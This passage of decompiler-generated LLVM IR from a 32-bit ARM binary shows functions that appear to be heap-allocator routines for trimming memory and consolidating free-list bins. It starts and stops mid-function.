  uselistorder label %dec_label_pc_12b10, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_12af4, { 8, 3, 4, 1, 2, 5, 6, 0, 7 }
  uselistorder label %bb34, { 1, 0 }
  uselistorder label %dec_label_pc_12a20, { 1, 0 }
  uselistorder label %dec_label_pc_129c0, { 1, 2, 0 }
  uselistorder label %.thread6, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_1290c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_12900, { 1, 0 }
  uselistorder label %dec_label_pc_128fc, { 1, 0 }
  uselistorder label %bb29, { 1, 0 }
  uselistorder label %bb27, { 1, 0 }
}

define i32 @function_12b24(i32 %arg1) local_unnamed_addr {
dec_label_pc_12b24:
  %v0_12b24 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_12b24, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_12b24
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_12b24, %bb
  %v10_12b38 = phi i32 [ %arg1, %dec_label_pc_12b24 ], [ 0, %bb ]
  ret i32 %v10_12b38

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @function_12b3c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_12b3c:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v1_12b3c = add i32 %arg2, 44
  %v2_12b3c = inttoptr i32 %v1_12b3c to i32*
  %v3_12b3c = load i32, i32* %v2_12b3c, align 4
  %v1_12b44 = add i32 %v3_12b3c, 4
  %v2_12b44 = inttoptr i32 %v1_12b44 to i32*
  %v3_12b44 = load i32, i32* %v2_12b44, align 4
  %v1_12b48 = add i32 %arg2, 860
  %v2_12b48 = inttoptr i32 %v1_12b48 to i32*
  %v3_12b48 = load i32, i32* %v2_12b48, align 4
  store i32 %v3_12b48, i32* @r4, align 4
  %v1_12b4c = and i32 %v3_12b44, -4
  store i32 %v1_12b4c, i32* @r6, align 4
  %v1_12b50 = add i32 %v1_12b4c, -17
  %v2_12b54 = add i32 %v1_12b50, %v3_12b48
  store i32 %arg2, i32* @r5, align 4
  %v2_12b60 = sub i32 %v2_12b54, %arg1
  store i32 %v2_12b60, i32* @r0, align 4
  store i32 %v3_12b48, i32* @r1, align 4
  %v0_12b68 = call i32 @function_10da8()
  %v1_12b6c = add i32 %v0_12b68, -1
  store i32 %v1_12b6c, i32* %r0.global-to-local, align 4
  %v0_12b70 = load i32, i32* @r4, align 4
  %v2_12b70 = mul i32 %v0_12b70, %v1_12b6c
  store i32 %v2_12b70, i32* %r7.global-to-local, align 4
  %v2_12b74 = icmp eq i32 %v2_12b70, 0
  store i1 %v2_12b74, i1* @cpsr_z, align 1
  %tmp8 = icmp slt i32 %v2_12b70, 1
  br i1 %tmp8, label %dec_label_pc_12bdc, label %dec_label_pc_12b7c

dec_label_pc_12b7c:                               ; preds = %dec_label_pc_12b3c
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_12b80 = call i32 @function_142a8(i32 0)
  store i32 %v1_12b80, i32* %r0.global-to-local, align 4
  %v0_12b84 = load i32, i32* @r5, align 4
  %v1_12b84 = add i32 %v0_12b84, 44
  %v2_12b84 = inttoptr i32 %v1_12b84 to i32*
  %v3_12b84 = load i32, i32* %v2_12b84, align 4
  %v0_12b88 = load i32, i32* @r6, align 4
  %v2_12b88 = add i32 %v0_12b88, %v3_12b84
  %v9_12b8c = icmp eq i32 %v1_12b80, %v2_12b88
  store i1 %v9_12b8c, i1* @cpsr_z, align 1
  store i32 %v1_12b80, i32* @r4, align 4
  br i1 %v9_12b8c, label %dec_label_pc_12b98, label %dec_label_pc_12bdc

dec_label_pc_12b98:                               ; preds = %dec_label_pc_12b7c
  %v0_12b98 = load i32, i32* %r7.global-to-local, align 4
  %v1_12b98 = sub i32 0, %v0_12b98
  store i32 %v1_12b98, i32* %r0.global-to-local, align 4
  %v1_12b9c = call i32 @function_142a8(i32 %v1_12b98)
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_12ba4 = call i32 @function_142a8(i32 0)
  store i32 %v1_12ba4, i32* %r0.global-to-local, align 4
  %v7_12ba8 = icmp eq i32 %v1_12ba4, -1
  store i1 %v7_12ba8, i1* @cpsr_z, align 1
  br i1 %v7_12ba8, label %dec_label_pc_12bdc, label %dec_label_pc_12bb0

dec_label_pc_12bb0:                               ; preds = %dec_label_pc_12b98
  %v0_12bb0 = load i32, i32* @r4, align 4
  %v2_12bb0 = sub i32 %v0_12bb0, %v1_12ba4
  store i32 %v2_12bb0, i32* %r0.global-to-local, align 4
  %v9_12bb0 = icmp eq i32 %v0_12bb0, %v1_12ba4
  store i1 %v9_12bb0, i1* @cpsr_z, align 1
  br i1 %v9_12bb0, label %dec_label_pc_12bdc, label %dec_label_pc_12bb8

dec_label_pc_12bb8:                               ; preds = %dec_label_pc_12bb0
  %v0_12bb8 = load i32, i32* @r5, align 4
  %v1_12bb8 = add i32 %v0_12bb8, 872
  %v2_12bb8 = inttoptr i32 %v1_12bb8 to i32*
  %v3_12bb8 = load i32, i32* %v2_12bb8, align 4
  %v1_12bbc = load i32, i32* @r6, align 4
  %v2_12bbc = sub i32 %v1_12bbc, %v2_12bb0
  store i32 %v2_12bbc, i32* %r2.global-to-local, align 4
  %v1_12bc0 = add i32 %v0_12bb8, 44
  %v2_12bc0 = inttoptr i32 %v1_12bc0 to i32*
  %v3_12bc0 = load i32, i32* %v2_12bc0, align 4
  store i32 %v3_12bc0, i32* %r1.global-to-local, align 4
  %v2_12bc4 = sub i32 %v3_12bb8, %v2_12bb0
  %v1_12bc8 = or i32 %v2_12bbc, 1
  store i32 %v1_12bc8, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 %v2_12bc4, i32* %v2_12bb8, align 4
  %v0_12bd4 = load i32, i32* %r2.global-to-local, align 4
  %v1_12bd4 = load i32, i32* %r1.global-to-local, align 4
  %v2_12bd4 = add i32 %v1_12bd4, 4
  %v3_12bd4 = inttoptr i32 %v2_12bd4 to i32*
  store i32 %v0_12bd4, i32* %v3_12bd4, align 4
  %v1_12be8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12be0

dec_label_pc_12bdc:                               ; preds = %dec_label_pc_12b7c, %dec_label_pc_12bb0, %dec_label_pc_12b98, %dec_label_pc_12b3c
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12be0

dec_label_pc_12be0:                               ; preds = %dec_label_pc_12bb8, %dec_label_pc_12bdc
  %v1_12be8 = phi i32 [ %v1_12be8.pre, %dec_label_pc_12bb8 ], [ 0, %dec_label_pc_12bdc ]
  ret i32 %v1_12be8

; uselistorder directives
  uselistorder i1 %v7_12ba8, { 1, 0 }
  uselistorder i32 %v1_12ba4, { 2, 1, 0, 3 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 10, 9, 8, 0 }
  uselistorder i32 872, { 1, 0, 2, 3, 4, 5, 6, 7 }
  uselistorder i32 (i32)* @function_142a8, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg2, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_12be0, { 1, 0 }
  uselistorder label %dec_label_pc_12bdc, { 1, 2, 0, 3 }
}

define i32 @function_12bec() local_unnamed_addr {
dec_label_pc_12bec:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_12bec = load i32, i32* @r4, align 4
  store i32 %v3_12bec, i32* %stack_var_-36, align 4
  %v0_12bf0 = load i32, i32* @r0, align 4
  %v1_12bf0 = inttoptr i32 %v0_12bf0 to i32*
  %v2_12bf0 = load i32, i32* %v1_12bf0, align 4
  store i32 %v2_12bf0, i32* %r3.global-to-local, align 4
  %v2_12bf4 = icmp eq i32 %v2_12bf0, 0
  store i32 %v0_12bf0, i32* @r4, align 4
  br i1 %v2_12bf4, label %dec_label_pc_12d2c.preheader, label %dec_label_pc_12c08

dec_label_pc_12d2c.preheader:                     ; preds = %dec_label_pc_12bec
  store i32 2, i32* %r2.global-to-local, align 4
  %v1_12d3425 = add i32 %v0_12bf0, 52
  store i32 %v1_12d3425, i32* %r3.global-to-local, align 4
  %v2_12d3c26 = add i32 %v0_12bf0, 60
  %v3_12d3c27 = inttoptr i32 %v2_12d3c26 to i32*
  store i32 %v1_12d3425, i32* %v3_12d3c27, align 4
  %v0_12d4028 = load i32, i32* %r3.global-to-local, align 4
  %v2_12d4029 = add i32 %v0_12d4028, 12
  %v3_12d4030 = inttoptr i32 %v2_12d4029 to i32*
  store i32 %v0_12d4028, i32* %v3_12d4030, align 4
  br label %dec_label_pc_12d2c.dec_label_pc_12d2c_crit_edge

dec_label_pc_12c08:                               ; preds = %dec_label_pc_12bec
  %v1_12c08 = and i32 %v2_12bf0, -3
  %v3_12c0c = udiv i32 %v2_12bf0, 8
  store i32 %v3_12c0c, i32* %r2.global-to-local, align 4
  store i32 %v1_12c08, i32* %v1_12bf0, align 4
  %v0_12c14 = load i32, i32* @r0, align 4
  %v1_12c14 = add i32 %v0_12c14, -4
  store i32 %v1_12c14, i32* %r3.global-to-local, align 4
  %v1_12c18 = load i32, i32* %r2.global-to-local, align 4
  %v4_12c18 = mul i32 %v1_12c18, 4
  %v5_12c18 = add i32 %v4_12c18, %v1_12c14
  store i32 %v5_12c18, i32* %sb.global-to-local, align 4
  %v1_12c1c = add i32 %v0_12c14, 52
  store i32 %v1_12c1c, i32* %r7.global-to-local, align 4
  %v1_12c20 = add i32 %v0_12c14, 4
  store i32 %v1_12c20, i32* %r6.global-to-local, align 4
  store i32 0, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_12c28

dec_label_pc_12c28:                               ; preds = %dec_label_pc_12d24, %dec_label_pc_12c08
  %v1_12d1c10 = phi i32 [ %v1_12d1c, %dec_label_pc_12d24 ], [ %v5_12c18, %dec_label_pc_12c08 ]
  %v1_12c34 = phi i32 [ %v1_12d24, %dec_label_pc_12d24 ], [ %v1_12c20, %dec_label_pc_12c08 ]
  %v1_12c28 = inttoptr i32 %v1_12c34 to i32*
  %v2_12c28 = load i32, i32* %v1_12c28, align 4
  store i32 %v2_12c28, i32* %r1.global-to-local, align 4
  %v2_12c2c = icmp eq i32 %v2_12c28, 0
  br i1 %v2_12c2c, label %dec_label_pc_12d1c, label %dec_label_pc_12c34

dec_label_pc_12c34:                               ; preds = %dec_label_pc_12c28
  %v0_12c34 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_12c34, i32* %v1_12c28, align 4
  %v0_12c38.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_12c38

dec_label_pc_12c38:                               ; preds = %dec_label_pc_12d10, %dec_label_pc_12c34
  %v0_12c54 = phi i32 [ %v0_12d10, %dec_label_pc_12d10 ], [ %v0_12c38.pre, %dec_label_pc_12c34 ]
  %v1_12c38 = add i32 %v0_12c54, 4
  %v2_12c38 = inttoptr i32 %v1_12c38 to i32*
  %v3_12c38 = load i32, i32* %v2_12c38, align 4
  store i32 %v3_12c38, i32* %r3.global-to-local, align 4
  %v1_12c3c = and i32 %v3_12c38, -2
  store i32 %v1_12c3c, i32* %lr.global-to-local, align 4
  %v2_12c40 = add i32 %v1_12c3c, %v0_12c54
  store i32 %v2_12c40, i32* @r0, align 4
  %v1_12c44 = urem i32 %v3_12c38, 2
  %v2_12c44 = icmp eq i32 %v1_12c44, 0
  %v1_12c48 = add i32 %v0_12c54, 8
  %v2_12c48 = inttoptr i32 %v1_12c48 to i32*
  %v3_12c48 = load i32, i32* %v2_12c48, align 4
  store i32 %v3_12c48, i32* %sl.global-to-local, align 4
  %v1_12c4c = add i32 %v2_12c40, 4
  %v2_12c4c = inttoptr i32 %v1_12c4c to i32*
  %v3_12c4c = load i32, i32* %v2_12c4c, align 4
  store i32 %v3_12c4c, i32* %r8.global-to-local, align 4
  br i1 %v2_12c44, label %dec_label_pc_12c54, label %dec_label_pc_12c88

dec_label_pc_12c54:                               ; preds = %dec_label_pc_12c38
  %v1_12c54 = inttoptr i32 %v0_12c54 to i32*
  %v2_12c54 = load i32, i32* %v1_12c54, align 4
  store i32 %v2_12c54, i32* %r5.global-to-local, align 4
  %v2_12c58 = sub i32 %v0_12c54, %v2_12c54
  store i32 %v2_12c58, i32* %r3.global-to-local, align 4
  %v1_12c5c = add i32 %v2_12c58, 8
  %v2_12c5c = inttoptr i32 %v1_12c5c to i32*
  %v3_12c5c = load i32, i32* %v2_12c5c, align 4
  store i32 %v3_12c5c, i32* %ip.global-to-local, align 4
  %v1_12c60 = add i32 %v3_12c5c, 12
  %v2_12c60 = inttoptr i32 %v1_12c60 to i32*
  %v3_12c60 = load i32, i32* %v2_12c60, align 4
  store i32 %v3_12c60, i32* %r1.global-to-local, align 4
  %v9_12c64 = icmp eq i32 %v3_12c60, %v2_12c58
  %v1_12c68 = add i32 %v2_12c58, 12
  %v2_12c68 = inttoptr i32 %v1_12c68 to i32*
  %v3_12c68 = load i32, i32* %v2_12c68, align 4
  store i32 %v3_12c68, i32* %r2.global-to-local, align 4
  br i1 %v9_12c64, label %dec_label_pc_12c70, label %dec_label_pc_12ccc

dec_label_pc_12c70:                               ; preds = %dec_label_pc_12c54
  %v1_12c70 = add i32 %v3_12c68, 8
  %v2_12c70 = inttoptr i32 %v1_12c70 to i32*
  %v3_12c70 = load i32, i32* %v2_12c70, align 4
  store i32 %v3_12c70, i32* %r3.global-to-local, align 4
  %v9_12c74 = icmp eq i32 %v3_12c70, %v2_12c58
  br i1 %v9_12c74, label %dec_label_pc_12c7c, label %dec_label_pc_12ccc

dec_label_pc_12c7c:                               ; preds = %dec_label_pc_12c70
  store i32 %v3_12c5c, i32* %v2_12c70, align 4
  %v0_12c80 = load i32, i32* %r2.global-to-local, align 4
  %v1_12c80 = load i32, i32* %ip.global-to-local, align 4
  %v2_12c80 = add i32 %v1_12c80, 12
  %v3_12c80 = inttoptr i32 %v2_12c80 to i32*
  store i32 %v0_12c80, i32* %v3_12c80, align 4
  %v0_12c84 = load i32, i32* %lr.global-to-local, align 4
  %v1_12c84 = load i32, i32* %r5.global-to-local, align 4
  %v2_12c84 = add i32 %v1_12c84, %v0_12c84
  store i32 %v2_12c84, i32* %lr.global-to-local, align 4
  %v0_12c8c.pre = load i32, i32* @r0, align 4
  %v0_12c90.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_12c88

dec_label_pc_12c88:                               ; preds = %dec_label_pc_12c38, %dec_label_pc_12c7c
  %v0_12d00 = phi i32 [ %v1_12c3c, %dec_label_pc_12c38 ], [ %v2_12c84, %dec_label_pc_12c7c ]
  %v0_12c90 = phi i32 [ %v3_12c4c, %dec_label_pc_12c38 ], [ %v0_12c90.pre, %dec_label_pc_12c7c ]
  %v1_12ca4 = phi i32 [ %v2_12c40, %dec_label_pc_12c38 ], [ %v0_12c8c.pre, %dec_label_pc_12c7c ]
  %v0_12c88 = load i32, i32* @r4, align 4
  %v1_12c88 = add i32 %v0_12c88, 44
  %v2_12c88 = inttoptr i32 %v1_12c88 to i32*
  %v3_12c88 = load i32, i32* %v2_12c88, align 4
  store i32 %v3_12c88, i32* %r3.global-to-local, align 4
  %v9_12c8c = icmp eq i32 %v1_12ca4, %v3_12c88
  %v1_12c90 = and i32 %v0_12c90, -4
  store i32 %v1_12c90, i32* %r5.global-to-local, align 4
  br i1 %v9_12c8c, label %dec_label_pc_12d00, label %dec_label_pc_12c98

dec_label_pc_12c98:                               ; preds = %dec_label_pc_12c88
  %v2_12c98 = add i32 %v1_12ca4, %v1_12c90
  store i32 %v2_12c98, i32* %r3.global-to-local, align 4
  %v1_12c9c = add i32 %v2_12c98, 4
  %v2_12c9c = inttoptr i32 %v1_12c9c to i32*
  %v3_12c9c = load i32, i32* %v2_12c9c, align 4
  store i32 %v3_12c9c, i32* %r3.global-to-local, align 4
  %v1_12ca0 = urem i32 %v3_12c9c, 2
  %v2_12ca0 = icmp eq i32 %v1_12ca0, 0
  %v2_12ca4 = add i32 %v1_12ca4, 4
  %v3_12ca4 = inttoptr i32 %v2_12ca4 to i32*
  store i32 %v1_12c90, i32* %v3_12ca4, align 4
  br i1 %v2_12ca0, label %dec_label_pc_12cac, label %dec_label_pc_12c98.dec_label_pc_12cdc_crit_edge

dec_label_pc_12c98.dec_label_pc_12cdc_crit_edge:  ; preds = %dec_label_pc_12c98
  %v0_12ce0.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_12cdc

dec_label_pc_12cac:                               ; preds = %dec_label_pc_12c98
  %v0_12cac = load i32, i32* @r0, align 4
  %v1_12cac = add i32 %v0_12cac, 8
  %v2_12cac = inttoptr i32 %v1_12cac to i32*
  %v3_12cac = load i32, i32* %v2_12cac, align 4
  store i32 %v3_12cac, i32* %ip.global-to-local, align 4
  %v1_12cb0 = add i32 %v3_12cac, 12
  %v2_12cb0 = inttoptr i32 %v1_12cb0 to i32*
  %v3_12cb0 = load i32, i32* %v2_12cb0, align 4
  store i32 %v3_12cb0, i32* %r3.global-to-local, align 4
  %v9_12cb4 = icmp eq i32 %v3_12cb0, %v0_12cac
  %v1_12cb8 = add i32 %v0_12cac, 12
  %v2_12cb8 = inttoptr i32 %v1_12cb8 to i32*
  %v3_12cb8 = load i32, i32* %v2_12cb8, align 4
  store i32 %v3_12cb8, i32* %r2.global-to-local, align 4
  br i1 %v9_12cb4, label %dec_label_pc_12cc0, label %dec_label_pc_12ccc

dec_label_pc_12cc0:                               ; preds = %dec_label_pc_12cac
  %v1_12cc0 = add i32 %v3_12cb8, 8
  %v2_12cc0 = inttoptr i32 %v1_12cc0 to i32*
  %v3_12cc0 = load i32, i32* %v2_12cc0, align 4
  store i32 %v3_12cc0, i32* %r3.global-to-local, align 4
  %v9_12cc4 = icmp eq i32 %v3_12cc0, %v0_12cac
  br i1 %v9_12cc4, label %dec_label_pc_12cd0, label %dec_label_pc_12ccc

dec_label_pc_12ccc:                               ; preds = %dec_label_pc_12cac, %dec_label_pc_12c70, %dec_label_pc_12c54, %dec_label_pc_12cc0
  %v0_12ccc = call i32 @function_1301c()
  store i32 %v0_12ccc, i32* @r0, align 4
  %v0_12cd0.pre = load i32, i32* @ip, align 4
  %v1_12cd0.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_12cd0

dec_label_pc_12cd0:                               ; preds = %dec_label_pc_12cc0, %dec_label_pc_12ccc
  %v1_12cd0 = phi i32 [ %v3_12cb8, %dec_label_pc_12cc0 ], [ %v1_12cd0.pre, %dec_label_pc_12ccc ]
  %v0_12cd0 = phi i32 [ %v3_12cac, %dec_label_pc_12cc0 ], [ %v0_12cd0.pre, %dec_label_pc_12ccc ]
  %v2_12cd0 = add i32 %v1_12cd0, 8
  %v3_12cd0 = inttoptr i32 %v2_12cd0 to i32*
  store i32 %v0_12cd0, i32* %v3_12cd0, align 4
  %v0_12cd4 = load i32, i32* %r2.global-to-local, align 4
  %v1_12cd4 = load i32, i32* %ip.global-to-local, align 4
  %v2_12cd4 = add i32 %v1_12cd4, 12
  %v3_12cd4 = inttoptr i32 %v2_12cd4 to i32*
  store i32 %v0_12cd4, i32* %v3_12cd4, align 4
  %v0_12cd8 = load i32, i32* %lr.global-to-local, align 4
  %v1_12cd8 = load i32, i32* %r5.global-to-local, align 4
  %v2_12cd8 = add i32 %v1_12cd8, %v0_12cd8
  store i32 %v2_12cd8, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_12cdc

dec_label_pc_12cdc:                               ; preds = %dec_label_pc_12c98.dec_label_pc_12cdc_crit_edge, %dec_label_pc_12cd0
  %v0_12ce0 = phi i32 [ %v0_12ce0.pre, %dec_label_pc_12c98.dec_label_pc_12cdc_crit_edge ], [ %v2_12cd8, %dec_label_pc_12cd0 ]
  %v0_12cdc = load i32, i32* %r7.global-to-local, align 4
  %v1_12cdc = add i32 %v0_12cdc, 8
  %v2_12cdc = inttoptr i32 %v1_12cdc to i32*
  %v3_12cdc = load i32, i32* %v2_12cdc, align 4
  store i32 %v3_12cdc, i32* %r2.global-to-local, align 4
  %v1_12ce0 = or i32 %v0_12ce0, 1
  store i32 %v1_12ce0, i32* %r3.global-to-local, align 4
  %v0_12ce4 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_12ce4, i32* %v2_12cdc, align 4
  %v0_12ce8 = load i32, i32* %r1.global-to-local, align 4
  %v1_12ce8 = load i32, i32* %r2.global-to-local, align 4
  %v2_12ce8 = add i32 %v1_12ce8, 12
  %v3_12ce8 = inttoptr i32 %v2_12ce8 to i32*
  store i32 %v0_12ce8, i32* %v3_12ce8, align 4
  %v0_12cec = load i32, i32* %lr.global-to-local, align 4
  %v1_12cec = load i32, i32* %r1.global-to-local, align 4
  %v3_12cec = add i32 %v1_12cec, %v0_12cec
  %v4_12cec = inttoptr i32 %v3_12cec to i32*
  store i32 %v0_12cec, i32* %v4_12cec, align 4
  %v0_12cf0 = load i32, i32* %r3.global-to-local, align 4
  %v1_12cf0 = load i32, i32* %r1.global-to-local, align 4
  %v2_12cf0 = add i32 %v1_12cf0, 4
  %v3_12cf0 = inttoptr i32 %v2_12cf0 to i32*
  store i32 %v0_12cf0, i32* %v3_12cf0, align 4
  %v0_12cf4 = load i32, i32* %r2.global-to-local, align 4
  %v1_12cf4 = load i32, i32* %r1.global-to-local, align 4
  %v2_12cf4 = add i32 %v1_12cf4, 8
  %v3_12cf4 = inttoptr i32 %v2_12cf4 to i32*
  store i32 %v0_12cf4, i32* %v3_12cf4, align 4
  %v0_12cf8 = load i32, i32* %r7.global-to-local, align 4
  %v1_12cf8 = load i32, i32* %r1.global-to-local, align 4
  %v2_12cf8 = add i32 %v1_12cf8, 12
  %v3_12cf8 = inttoptr i32 %v2_12cf8 to i32*
  store i32 %v0_12cf8, i32* %v3_12cf8, align 4
  br label %dec_label_pc_12d10

dec_label_pc_12d00:                               ; preds = %dec_label_pc_12c88
  %v2_12d00 = add i32 %v1_12c90, %v0_12d00
  %v1_12d04 = or i32 %v2_12d00, 1
  store i32 %v1_12d04, i32* %r3.global-to-local, align 4
  %v1_12d08 = load i32, i32* %r1.global-to-local, align 4
  %v2_12d08 = add i32 %v1_12d08, 4
  %v3_12d08 = inttoptr i32 %v2_12d08 to i32*
  store i32 %v1_12d04, i32* %v3_12d08, align 4
  %v0_12d0c = load i32, i32* %r1.global-to-local, align 4
  %v1_12d0c = load i32, i32* @r4, align 4
  %v2_12d0c = add i32 %v1_12d0c, 44
  %v3_12d0c = inttoptr i32 %v2_12d0c to i32*
  store i32 %v0_12d0c, i32* %v3_12d0c, align 4
  br label %dec_label_pc_12d10

dec_label_pc_12d10:                               ; preds = %dec_label_pc_12cdc, %dec_label_pc_12d00
  %v0_12d10 = load i32, i32* %sl.global-to-local, align 4
  %v2_12d10 = icmp eq i32 %v0_12d10, 0
  store i32 %v0_12d10, i32* %r1.global-to-local, align 4
  br i1 %v2_12d10, label %dec_label_pc_12d1c.loopexit, label %dec_label_pc_12c38

dec_label_pc_12d1c.loopexit:                      ; preds = %dec_label_pc_12d10
  %v0_12d1c.pre = load i32, i32* %r6.global-to-local, align 4
  %v1_12d1c.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_12d1c

dec_label_pc_12d1c:                               ; preds = %dec_label_pc_12d1c.loopexit, %dec_label_pc_12c28
  %v1_12d1c = phi i32 [ %v1_12d1c.pre, %dec_label_pc_12d1c.loopexit ], [ %v1_12d1c10, %dec_label_pc_12c28 ]
  %v0_12d24 = phi i32 [ %v0_12d1c.pre, %dec_label_pc_12d1c.loopexit ], [ %v1_12c34, %dec_label_pc_12c28 ]
  %v9_12d1c = icmp eq i32 %v0_12d24, %v1_12d1c
  br i1 %v9_12d1c, label %dec_label_pc_12d94, label %dec_label_pc_12d24

dec_label_pc_12d24:                               ; preds = %dec_label_pc_12d1c
  %v1_12d24 = add i32 %v0_12d24, 4
  store i32 %v1_12d24, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_12c28

dec_label_pc_12d2c.dec_label_pc_12d2c_crit_edge:  ; preds = %dec_label_pc_12d2c.preheader, %dec_label_pc_12d2c.dec_label_pc_12d2c_crit_edge
  %v0_12d2c.pre = load i32, i32* @r4, align 4
  %v1_12d2c.pre = load i32, i32* %r2.global-to-local, align 4
  %v4_12d2c = mul i32 %v1_12d2c.pre, 8
  %v5_12d2c = add i32 %v4_12d2c, %v0_12d2c.pre
  %v1_12d30 = add i32 %v1_12d2c.pre, 1
  store i32 %v1_12d30, i32* %r2.global-to-local, align 4
  %v1_12d34 = add i32 %v5_12d2c, 44
  store i32 %v1_12d34, i32* %r3.global-to-local, align 4
  %v2_12d3c = add i32 %v5_12d2c, 52
  %v3_12d3c = inttoptr i32 %v2_12d3c to i32*
  store i32 %v1_12d34, i32* %v3_12d3c, align 4
  %v0_12d40 = load i32, i32* %r3.global-to-local, align 4
  %v2_12d40 = add i32 %v0_12d40, 12
  %v3_12d40 = inttoptr i32 %v2_12d40 to i32*
  store i32 %v0_12d40, i32* %v3_12d40, align 4
  %v7_12d44 = icmp sgt i32 %v1_12d30, 95
  br i1 %v7_12d44, label %dec_label_pc_12d48, label %dec_label_pc_12d2c.dec_label_pc_12d2c_crit_edge

dec_label_pc_12d48:                               ; preds = %dec_label_pc_12d2c.dec_label_pc_12d2c_crit_edge
  %v0_12d48 = load i32, i32* @r4, align 4
  %v1_12d48 = inttoptr i32 %v0_12d48 to i32*
  %v2_12d48 = load i32, i32* %v1_12d48, align 4
  store i32 %v2_12d48, i32* %r2.global-to-local, align 4
  %v1_12d4c = add i32 %v0_12d48, 864
  %v2_12d4c = inttoptr i32 %v1_12d4c to i32*
  %v3_12d4c = load i32, i32* %v2_12d4c, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_12d54 = urem i32 %v2_12d48, 4
  store i32 262144, i32* %r0.global-to-local, align 4
  %v1_12d5c = or i32 %v3_12d4c, 1
  store i32 %v1_12d5c, i32* %r1.global-to-local, align 4
  %v1_12d60 = or i32 %v1_12d54, 72
  store i32 %v1_12d60, i32* %r2.global-to-local, align 4
  %v1_12d64 = add i32 %v0_12d48, 52
  store i32 %v1_12d64, i32* %ip.global-to-local, align 4
  %v2_12d68 = add i32 %v0_12d48, 840
  %v3_12d68 = inttoptr i32 %v2_12d68 to i32*
  store i32 0, i32* %v3_12d68, align 4
  %v0_12d6c = load i32, i32* %r3.global-to-local, align 4
  %v1_12d6c = add i32 %v0_12d6c, 65536
  store i32 %v1_12d6c, i32* %r3.global-to-local, align 4
  %v0_12d70 = load i32, i32* %r0.global-to-local, align 4
  %v1_12d70 = load i32, i32* @r4, align 4
  %v2_12d70 = add i32 %v1_12d70, 836
  %v3_12d70 = inttoptr i32 %v2_12d70 to i32*
  store i32 %v0_12d70, i32* %v3_12d70, align 4
  %v0_12d74 = load i32, i32* %r0.global-to-local, align 4
  %v1_12d74 = load i32, i32* @r4, align 4
  %v2_12d74 = add i32 %v1_12d74, 844
  %v3_12d74 = inttoptr i32 %v2_12d74 to i32*
  store i32 %v0_12d74, i32* %v3_12d74, align 4
  %v1_12d78 = load i32, i32* @r4, align 4
  %v2_12d78 = add i32 %v1_12d78, 852
  %v3_12d78 = inttoptr i32 %v2_12d78 to i32*
  store i32 %v1_12d6c, i32* %v3_12d78, align 4
  %v1_12d7c = load i32, i32* @r4, align 4
  %v2_12d7c = add i32 %v1_12d7c, 864
  %v3_12d7c = inttoptr i32 %v2_12d7c to i32*
  store i32 %v1_12d5c, i32* %v3_12d7c, align 4
  %v1_12d80 = load i32, i32* @r4, align 4
  %v2_12d80 = inttoptr i32 %v1_12d80 to i32*
  store i32 %v1_12d60, i32* %v2_12d80, align 4
  %v0_12d84 = load i32, i32* %ip.global-to-local, align 4
  %v1_12d84 = load i32, i32* @r4, align 4
  %v2_12d84 = add i32 %v1_12d84, 44
  %v3_12d84 = inttoptr i32 %v2_12d84 to i32*
  store i32 %v0_12d84, i32* %v3_12d84, align 4
  store i32 30, i32* %r0.global-to-local, align 4
  %v4_12d8c = call i32 @function_135f0(i32 30, i32 %v1_12d5c, i32 %v1_12d60, i32 %v1_12d6c)
  store i32 %v4_12d8c, i32* @r0, align 4
  %v1_12d90 = load i32, i32* @r4, align 4
  %v2_12d90 = add i32 %v1_12d90, 860
  %v3_12d90 = inttoptr i32 %v2_12d90 to i32*
  store i32 %v4_12d8c, i32* %v3_12d90, align 4
  br label %dec_label_pc_12d94

dec_label_pc_12d94:                               ; preds = %dec_label_pc_12d1c, %dec_label_pc_12d48
  %v2_12d98 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_12d98, i32* @r4, align 4
  %v1_12d9c = load i32, i32* @r0, align 4
  ret i32 %v1_12d9c

; uselistorder directives
  uselistorder i32 %v0_12d48, { 1, 0, 2, 3 }
  uselistorder i32 %v0_12d40, { 1, 0 }
  uselistorder i32 %v1_12d24, { 1, 0 }
